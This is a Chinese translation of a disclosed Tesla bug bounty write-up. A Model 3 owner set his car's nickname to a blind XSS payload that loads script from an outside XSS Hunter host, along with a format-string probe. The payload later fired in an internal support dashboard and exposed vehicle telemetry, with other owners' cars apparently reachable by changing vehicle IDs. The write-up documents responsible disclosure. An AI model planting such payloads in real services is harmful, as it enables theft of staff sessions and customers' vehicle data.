***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**![screen1@2.jpg](https://image.3001.net/images/20190721/1563687218_5d33f932e235e.jpg!small)**

 **能有机会对Tesla Model 3进行安全测试是一件有趣的事，因为Tesla Model
3的内置系统有网页浏览器、免费高级的LTE和用于软件更新的OTA空中无线技术，说白了，它就是一台在飞驰车轮之上的联网计算机。**

所以，在今年年初我买了一辆Tesla Model
3，无论摆弄它还是驾驶它，我都乐在其中。新车到手的那几天，我在车库里琢磨了很长时间，试图让它执行一些本不该做的操作，看看有什么漏洞发现，非常幸运，我从中有所发现。

![01.jpg](https://image.3001.net/images/20190721/1563686896_5d33f7f0d6119.jpg!small)

## 2019年4月

首先，我研究的就是Tesla Model 3的“Name Your
Vehicle”（命名你的车辆）功能，该功能允许车主为自己的爱车设置昵称，并将其保存到个人账户中，当车辆推送充电完成等操作通知时，这个车辆昵称可显示在车主的手机端移动应用上。“Name
Your Vehicle”功能在以下右上角图示按钮：

![02.jpg](https://image.3001.net/images/20190721/1563686887_5d33f7e76e9c0.jpg!small)刚开始，我把车辆昵称设置为了
** _“%x.%x.%x.%x”_** ，想看看它是否像2011款宝马330i一样存在格式字符串漏洞（CVE-2017-9212），但遗憾的是，没有。

> CVE-2017-9212：Bluetooth stack是应用在BMW 330i中的一个蓝牙传输协议，BMW 330i
> 2011版本中的Bluetooth stack存在安全漏洞，远程攻击者可借助设备名中的
> %x或%c格式字符串说明符利用该漏洞造成CD/Multimedia软件崩溃。

![2019-07-21_132155.jpg](https://image.3001.net/images/20190721/1563686934_5d33f816a0231.jpg!small)我继续把玩“Name
Your Vehicle”功能的用户输入点，后来发现它可允许输入内容的长度非常长，于是，我把它命名为了一个XSS Payload- ** _“
><script src=//zlz.xss.ht></script>_**，看看它会否被其它功能调用执行。

![04.jpg](https://image.3001.net/images/20190721/1563686962_5d33f832159f0.jpg!small)接着，我又研究了其内置的网页浏览器，通过载入文件或构造URI，也没能在其上面实现任何可远程实现的操作，但整个过程很有意思。那天晚上我一无所获，就早早收场休息，也忘了把车辆昵称改回来，还是之前设置的那个Blind
XSS Payload。

## 2019年6月

在一次公路旅行中，一块大石头突然从什么地方冒出来，砸裂了我的挡风玻璃。

![05.jpg](https://image.3001.net/images/20190721/1563687004_5d33f85c763c5.jpg!small)之后，我在特斯拉手机端APP中预约了一次车检，就又继续日常驾驶了。第二天，我手机邮箱收到了一条XSS
Hunter提醒消息，其中提示有人查看了我的XSS Payload，也就是我之前设置的那个XSS昵称 - “><script
src=//zlz.xss.ht></script>。这就有意思了不是。

经检查，我发现特斯拉后台存在漏洞的页面URL为：

> <https://redacted.teslamotors.com/redacted/5057517/redacted>

XSS被执行的域为：

> <https://redacted.teslamotors.com>

Referer源页面为：

> <https://redacted.teslamotors.com/redacted/5YJ31337>

也就是说，特斯拉的后台员工在域名“redacted.teslamotors.com”
下，查看了我对挡风玻璃开裂的预约车检时，由于之前我设置了车辆昵称为“><script
src=//zlz.xss.ht></script>，因此触发了这个XSS Payload。

XSS
Hunter的提醒消息截图显示，经由上述存在漏洞的页面URL，特斯拉后台服务端可以响应显示出一些有关车辆的关键数据信息，并且可以通过增加URL中的车辆标识号（Vehicle
ID ），来获取到其它车主名下特斯拉车辆的关键数据信息。这里的的车辆标识号Vehicle ID就是正文中的VIN Number。我猜想，XSS
Payload的触发位置可能位于特斯拉的某个车辆管理界面中。

XSS Hunter的截图表明，我这辆车的速度、温度、版本号、胎压、锁定情况、警报等其它具体信息都被显示出来了。如下：

    
    
    VIN: 5YJ3E13374KF2313373
    
    Car Type: 3 P74D
    
    Birthday: Mon Mar 11 16:31:37 2019
    
    Car Version: develop-2019.20.1-203-991337d
    
    Car Computer: ice
    
    SOE / USOE: 48.9, 48.9 %
    
    SOC: 54.2 %
    
    Ideal energy remaining: 37.2 kWh
    
    Range: 151.7 mi
    
    Odometer: 4813.7 miles
    
    Gear: D
    
    Speed: 81 mph
    
    Local Time: Wed Jun 19 15:09:06 2019
    
    UTC Offset: -21600
    
    Timezone: Mountain Daylight Time
    
    BMS State: DRIVE
    
    12V Battery Voltage: 13.881 V
    
    12V Battery Current: 0.13 A
    
    Locked?: true
    
    UI Mode: comfort
    
    Language: English
    
    Service Alert: 0X0

另外，还存在固件、总结监测器、地理围栏位置（Geofence）、汽车配置和代码名称功能等非常有意思的信息标签，如下：

![06.png](https://image.3001.net/images/20190721/1563687074_5d33f8a2c32bc.png!small)

我曾尝试去访问上述漏洞页面中涉及的域名 - “redacted.teslamotors.com”
，但是却显示超时，这样看来它可能是特斯拉的一个内部Web应用。

更有意思的是，我认为特斯拉后台支持人员可能具备向汽车本身发送数据，远程对车辆进行配置更新的能力，我猜该应用可能是基于DOM超链接的方式管理车辆信息，但我没有进行深入测试。不过可以肯定的是，通过增加其中的车辆标识号（VIN）数字，向特斯拉后台发送支持性请求，这样，攻击者可以获取或更改其他车主名下的特斯拉汽车信息。

作为攻击者来说，可以向特斯拉后台提交多种支持性请求，以实现入侵攻破行为做足支撑。但出于对测试和其他车主的尊重，我没有这样做。因为实际上，通过响应信息的DOM结构和JavaScript代码，就可以向特斯拉后台伪造请求，获得我想要的信息。

## 漏洞上报

在开了将近11个小时的车之后，凌晨两点，我精神抖擞地编写完了漏洞报告上报给了特斯拉安全团队。很快，特斯拉就给我回复，漏洞最终被划分为P1重要级，在观点意见交换后，特斯拉在半天之内就推出了更新补丁。

![07.png](https://image.3001.net/images/20190721/1563687131_5d33f8db558cf.png!small)两周之后，特斯拉官方给了我$10,000美金的奖励，并确认这是一个高危漏洞。回顾该漏洞的发现过程，可以算是非常简单，但可以理解的是，有时候一些安全问题总会被忽视掉。虽然则开始我不确定该漏洞的确切影响，但它是有效真实的，至少可允许攻击者查看目标车辆的实时信息，并可能查看到其他车主的相关信息。

## 漏洞上报进程

> 2019.6.20 06:27:30 UTC 漏洞上报
>
> 2019.6.20 20:35:35 UTC 漏洞分类、推出补丁
>
> 2019.7.11 16:07:59 UTC $10,000赏金发放

 ***参考来源：[samcurry](https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/)，clouds编译，转载请注明来自FreeBuf.COM **  

